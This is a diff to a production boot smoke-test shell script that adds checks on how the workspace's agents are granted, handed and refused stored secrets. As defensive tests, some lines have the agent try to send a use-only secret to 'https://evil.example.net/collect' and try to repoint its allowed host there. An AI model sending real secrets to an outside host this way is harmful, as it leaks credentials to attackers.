@@ -12,8 +12,9 @@ Usage: infra/scripts/production-boot-smoke.sh [options]
 Boots the production Compose stack from nothing on this host and proves the
 path a new deployment takes: generated secrets, one `up -d`, HTTPS at the edge,
 first administrator, 2-step verification, an emailed invitation, a Drive
-upload, download, and malware rejection, and replacing the HTTPS certificate
-from the Admin console. With --with passwords it also installs the optional
+upload, download, and malware rejection, an agent using the secrets it was
+granted, and replacing the HTTPS certificate from the Admin console. With
+--with passwords it also installs the optional
 password manager and proves it is served on its own address, sends its
 sign-up confirmation, and appears for people once an administrator turns it on.
 With --with meet it adds docker-compose.meet.yml and holds a real meeting: two
@@ -632,6 +633,107 @@ expect "malware upload is rejected by the scanner" "$FINALIZE_STATUS" 409
 expect "rejected file cannot be downloaded" \
   "$(edge -b "$JAR" -H "origin: $BASE" -o /dev/null -w '%{http_code}' \
     "$BASE/v1/api/drive/objects/$OBJECT_ID/content?download=1")" 404
+
+# --- Agents and their secrets -----------------------------------------------
+# An administrator adds an agent, issues it an API key, and grants it secrets.
+# The agent is handed the one it may read and refused the one it may only use.
+
+# Tools check for an exact permission; the workspace's own administrator must
+# still be able to use the administration ones.
+expect "the first administrator can use administration tools" \
+  "$(status_of /v1/api/tools/chat.room.list_organization -d '{}')" 200
+
+agent_id=$(api /v1/api/admin/agents -d '{"displayName":"Release bot"}' | json agent.id)
+if [[ -n "$agent_id" ]]; then pass "an administrator adds an agent"; else fail "an administrator adds an agent"; fi
+
+# A tool call may wait for a person to confirm it. Given the response to one,
+# the owner confirms it if it is waiting; the result is printed either way.
+confirm_as_owner() {
+  local out=$1
+  if [[ "$(json status <<<"$out")" == pending_confirmation ]]; then
+    out=$(api "/v1/api/tools/pending/$(json pending.id <<<"$out")/approve" -d '{}')
+    [[ "$(json status <<<"$out")" == executed ]] &&
+      out=$(node -e 'process.stdout.write(JSON.stringify(JSON.parse(require("node:fs").readFileSync(0, "utf8")).output))' <<<"$out")
+  fi
+  printf '%s' "$out"
+}
+expires=$(node -e 'process.stdout.write(new Date(Date.now() + 86400000).toISOString())')
+issue_key() {
+  api /v1/api/tools/agent.credentials.create -d "{\"actorId\":\"$agent_id\",\"credentialType\":\"api_key\",\"label\":\"Release key\",\"purpose\":\"Boot smoke\",\"scopes\":[\"tools:read\",\"secrets.use\"],\"expiresAt\":\"$expires\"}"
+}
+handed_value="hunter2-$(openssl rand -hex 6)"
+hidden_value="tok_live_$(openssl rand -hex 8)"
+grant_to_agent() {
+  status_of "/v1/api/admin/agent-secrets/$1/grants" -X PUT -d "{\"actorIds\":[\"$agent_id\"]}"
+}
+expect "stores a secret an agent may be handed" "$(status_of /v1/api/admin/agent-secrets -d "{\"name\":\"portal-password\",\"mode\":\"handover\",\"value\":\"$handed_value\"}")" 201
+handed_id=$(json secret.id <"$WORK/last.json")
+# Sensitive actions wait for a second administrator until the organization
+# says otherwise. This one has a single administrator, who turns that off.
+expect "issuing a credential waits for a second administrator by default" \
+  "$(issue_key | json code)" crown_jewel_approval_required
+expect "granting a secret does too" "$(grant_to_agent "$handed_id")" 202
+expect "the only administrator turns the second-administrator rule off" \
+  "$(status_of /v1/api/admin/security-policies/mfa -X PUT -d '{"settings":{"secondAdminApprovalRequired":false}}')" 200
+issued=$(confirm_as_owner "$(issue_key)")
+agent_key=$(json secret <<<"$issued")
+if [[ "$agent_key" == helix_ak_* ]]; then
+  pass "and issues it an API key that may use secrets"
+else
+  fail "and issues it an API key that may use secrets ($(head -c 200 <<<"$issued"))"
+fi
+as_agent() {
+  local tool=$1
+  shift
+  edge -H "x-api-key: $agent_key" -H 'content-type: application/json' \
+    "$BASE/v1/api/tools/$tool" "$@"
+}
+
+expect "stores a secret an agent may only use" "$(status_of /v1/api/admin/agent-secrets -d "{\"name\":\"billing-api\",\"mode\":\"use_only\",\"value\":\"$hidden_value\",\"allowedHosts\":[\"api.example.com\"]}")" 201
+hidden_id=$(json secret.id <"$WORK/last.json")
+expect "a stored secret is available to no agent until it is granted" \
+  "$(as_agent secrets.list -d '{}' | node -e 'process.stdout.write(String(JSON.parse(require("node:fs").readFileSync(0, "utf8")).secrets.length))')" 0
+expect "the administrator grants both to the agent" \
+  "$(grant_to_agent "$handed_id") $(grant_to_agent "$hidden_id")" "200 200"
+expect "and one the agent was not granted" "$(status_of /v1/api/admin/agent-secrets -d '{"name":"not-for-agents","mode":"handover","value":"nobody-gets-this"}')" 201
+if api /v1/api/admin/agent-secrets | grep -q -e "$handed_value" -e "$hidden_value" -e nobody-gets-this; then
+  fail "a stored value is never sent back to the console"
+else
+  pass "a stored value is never sent back to the console"
+fi
+expect "a use-only secret cannot be pointed at another host without its value" \
+  "$(status_of "/v1/api/admin/agent-secrets/$hidden_id" -X PATCH -d '{"allowedHosts":["evil.example.net"]}')" 400
+
+expect "the agent sees the secrets it was granted, and only those" \
+  "$(as_agent secrets.list -d '{}' | node -e 'process.stdout.write(JSON.parse(require("node:fs").readFileSync(0, "utf8")).secrets.map((s) => `${s.name}:${s.mode}`).join(" "))')" \
+  "billing-api:use_only portal-password:handover"
+expect "the agent is handed the secret it may read" \
+  "$(as_agent secrets.get -d '{"name":"portal-password"}' | json value)" "$handed_value"
+expect "the agent is refused the secret it may only use" \
+  "$(as_agent secrets.get -d '{"name":"billing-api"}' -o "$WORK/agent.json" -w '%{http_code}')" 403
+if grep -q "$hidden_value" "$WORK/agent.json"; then
+  fail "the refusal does not carry the value"
+else
+  pass "the refusal does not carry the value"
+fi
+expect "the agent is told nothing about a secret it was not granted" \
+  "$(as_agent secrets.get -d '{"name":"not-for-agents"}' -o /dev/null -w '%{http_code}')" 404
+# Sending a secret is external communication, so it follows the confirmation
+# policy; either way it never goes to a host the secret is not allowed to reach.
+elsewhere=$(confirm_as_owner "$(as_agent secrets.http_request -d '{"secret":"billing-api","url":"https://evil.example.net/collect"}')")
+if grep -q "may be sent only to: api.example.com" <<<"$elsewhere"; then
+  pass "the agent cannot send a use-only secret to a host it was not stored for"
+else
+  fail "the agent cannot send a use-only secret to a host it was not stored for ($(head -c 200 <<<"$elsewhere"))"
+fi
+expect "a person cannot read agent secrets, administrator or not" \
+  "$(status_of /v1/api/tools/secrets.get -d '{"name":"portal-password"}')" 403
+expect "the agent's key cannot manage secrets" \
+  "$(edge -H "x-api-key: $agent_key" -o /dev/null -w '%{http_code}' "$BASE/v1/api/admin/agent-secrets")" 403
+expect "an administrator takes the grant away" \
+  "$(status_of "/v1/api/admin/agent-secrets/$handed_id/grants" -X PUT -d '{"actorIds":[]}')" 200
+expect "and the agent can no longer read the secret" \
+  "$(as_agent secrets.get -d '{"name":"portal-password"}' -o /dev/null -w '%{http_code}')" 404
 
 # --- HTTPS certificate managed from the Admin console -----------------------
 
